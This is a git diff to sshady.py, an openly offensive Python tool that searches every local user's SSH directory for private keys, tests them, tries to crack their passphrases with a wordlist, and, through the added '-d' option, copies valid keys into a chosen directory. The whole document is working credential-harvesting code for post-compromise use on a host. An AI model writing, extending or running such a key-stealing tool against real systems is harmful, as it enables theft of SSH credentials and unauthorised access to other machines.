@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-sshady.py -- SSH key pivoting things.
+sshady.py -- SSH key harvesting things.
           -- by Daniel Roberson @dmfroberson
 TODO:
   - Cracking improvements
@@ -15,6 +15,7 @@ Requires:
 
 import os
 import pwd
+import shutil
 import argparse
 import paramiko
 
@@ -23,6 +24,7 @@ import paramiko
 WORDLIST = "wordlist.txt"
 TERSE = False
 CRACK = True
+OUTDIR = None
 
 
 def xprint(message):
@@ -109,7 +111,7 @@ def try_key(keyfile, password=None):
     return False
 
 
-def process_key(keyfile):
+def process_key(keyfile, username):
     """ process_key() -- Determine whether a file is a valid SSH key or not and
                       -- act accordingly.
 
@@ -124,6 +126,13 @@ def process_key(keyfile):
 
     if result == True:
         xprint("  [+] %s appears to be a valid key" % keyfile)
+
+        # Copy keys for the future, if asked to do so.
+        if OUTDIR:
+            outfile = os.path.join(OUTDIR, "%s-%s" % \
+                                   (username, os.path.basename(keyfile)))
+            shutil.copy2(keyfile, outfile)
+
         if CRACK:
             xprint("    [*] Attempting to crack..")
             crack_key(keyfile, WORDLIST)
@@ -150,7 +159,7 @@ def parse_cli():
     Returns:
         ArgumentParser namespace relevant to supplied CLI options
     """
-    description = "example: ./sshady.py"
+    description = "example: ./sshady.py [-d <outdir>]"
     parser = argparse.ArgumentParser(description=description)
     parser.add_argument("-t",
                         "--terse",
@@ -161,14 +170,19 @@ def parse_cli():
     parser.add_argument("-w",
                         "--wordlist",
                         help="Specify wordlist to use. Default: %s" % WORDLIST,
-                        default=WORDLIST,
-                        required=False)
+                        required=False,
+                        default=WORDLIST)
     parser.add_argument("-n",
                         "--nocrack",
                         help="Don't attempt to crack SSH keys.",
                         action="store_false",
                         required=False,
                         default=True)
+    parser.add_argument("-d",
+                        "--directory",
+                        help="Optional directory to save keys to",
+                        required=False,
+                        default=None)
 
     args = parser.parse_args()
     return args
@@ -187,20 +201,36 @@ def main():
     global WORDLIST
     global TERSE
     global CRACK
+    global OUTDIR
 
     args = parse_cli()
     WORDLIST = args.wordlist
     TERSE = args.terse
     CRACK = args.nocrack
+    OUTDIR = args.directory
 
     xprint("[+] sshady.py -- by Daniel Roberson @dmfroberson")
     xprint("")
 
+    # Make sure wordlist is readable.
     if not os.access(WORDLIST, os.R_OK):
         xprint("[-] Unable to open wordlist %s for reading" % WORDLIST)
         xprint("[-] Exiting.")
         terseprint("Unable to open wordlist %s for reading. Exiting." % \
                    WORDLIST)
+        return os.EX_USAGE
+
+    # Make sure output directory is writable.
+    if OUTDIR and not os.path.isdir(OUTDIR):
+        xprint("[-] %s is not a directory." % OUTDIR)
+        xprint("[-] Exiting.")
+        terseprint("%s is not a directory. Exiting." % OUTDIR)
+        return os.EX_USAGE
+
+    if OUTDIR and not os.access(OUTDIR, os.W_OK):
+        xprint("[-] Unable to write to output directory %s" % OUTDIR)
+        xprint("[-] Exiting.")
+        terseprint("Unable to write to output directory %s. Exiting." % OUTDIR)
         return os.EX_USAGE
 
     xprint("[+] Searching for SSH keys..")
@@ -215,7 +245,7 @@ def main():
             for root, _, filenames in os.walk(sshdir):
                 for filename in filenames:
                     checkfile = os.path.join(root, filename)
-                    process_key(checkfile)
+                    process_key(checkfile, user)
 
     xprint("")
     xprint("[+] You must defeat Sheng Long to stand a chance.")
